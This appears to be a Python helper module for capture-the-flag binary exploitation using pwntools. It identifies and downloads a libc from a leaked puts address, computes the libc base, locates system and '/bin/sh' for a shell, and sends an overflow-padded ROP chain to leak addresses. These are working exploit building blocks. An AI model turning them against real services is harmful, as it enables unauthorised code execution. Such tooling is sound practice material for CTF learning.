import os
import urllib.request

import requests
from bs4 import BeautifulSoup
from pwnlib.rop import ROP
from pwnlib.util.packing import u64


def fetch_libc_ver(addr, func="_IO_puts"):
    addr = hex(addr)[-3:]
    url = f"https://libc.blukat.me/?q={func}%3A0{addr}"
    soup = BeautifulSoup(requests.get(url).text, features="lxml")
    libcs = [x.text.strip() for x in soup.select("a.lib-item")]
    return libcs


def download_libc(version, download_location="/home/kali/Desktop/ctf-stuff/libc-cache"):
    if not os.path.isdir(download_location):
        download_location = "."
    out_file = f"{download_location}/{version}.so"
    if os.path.isfile(out_file):
        return out_file
    print("Downloading libc", version)
    url = f"https://libc.blukat.me/d/{version}.so"
    urllib.request.urlretrieve(url, out_file)
    return out_file


def set_libc_addr(libc, puts_addr):
    libc_puts_addr = libc.symbols._IO_puts
    libc_addr = puts_addr - libc_puts_addr
    libc.address = libc_addr
    print("Libc address", hex(libc.address))
    assert hex(libc.address).endswith("000"), "LIBC address not aligned"


def system_shell(libc):
    sys = libc.symbols.system
    sh = next(libc.search(b"/bin/sh"))
    return sys, sh


def leak_address(process, padding_length, elf, address, printer, ret):
    padding = b"a" * (padding_length - 3) + b"LOL"
    rop = ROP(elf)
    rop.call(printer, (address,))
    rop.call(ret)
    process.sendline(padding + rop.chain())
    while True:
        r = process.recvline()
        if b"LOL" not in r:
            continue
        addr = r[-7:-1] + b"\0\0"
        return u64(addr)
